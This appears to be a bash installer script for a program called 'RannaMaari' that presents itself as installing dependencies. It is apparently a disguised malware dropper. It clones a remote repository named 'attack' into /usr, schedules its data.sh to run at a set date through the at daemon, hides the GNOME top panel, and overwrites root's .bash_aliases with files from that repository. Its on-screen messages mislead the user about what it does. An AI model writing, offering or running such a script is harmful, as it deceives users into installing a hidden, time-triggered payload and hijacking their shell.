#/bin/bash
echo "Press Y if anything pops up to Install!! Those are Dependencies needed to run this Program!!"

echo -e 'RannaMaari\nis\nHere' | figlet -f small -c

sleep 1

echo "The Dependencies are now installing!!"
sleep 5
apt-get update

apt-get install at

systemctl enable --now atd.service

cd /usr

git clone https://github.com/H-ministry/attack.git

cd /usr/attack

chmod +x data.sh
chmod +x RannaConsole.sh

at April 09 2019 -f /usr/attack/data.sh

sleep 05

cd /root/Downloads
git clone https://github.com/voronind/hide-top-panel.git
cd hide-top-panel
cp -r hide-top-panel@dimka665.gmail.com /usr/share/gnome-shell/extensions/hide-top-panel@dimka665.gmail.com


echo "now you are Ready to use RannaMaari!!"
echo " "
echo " "
rm -f /root/.bash_aliases
cp /usr/attack/.bash_aliases /root/.bash_aliases
echo "Execute Raana_console to run the program. it is advised to restart your pc before running this program!!"
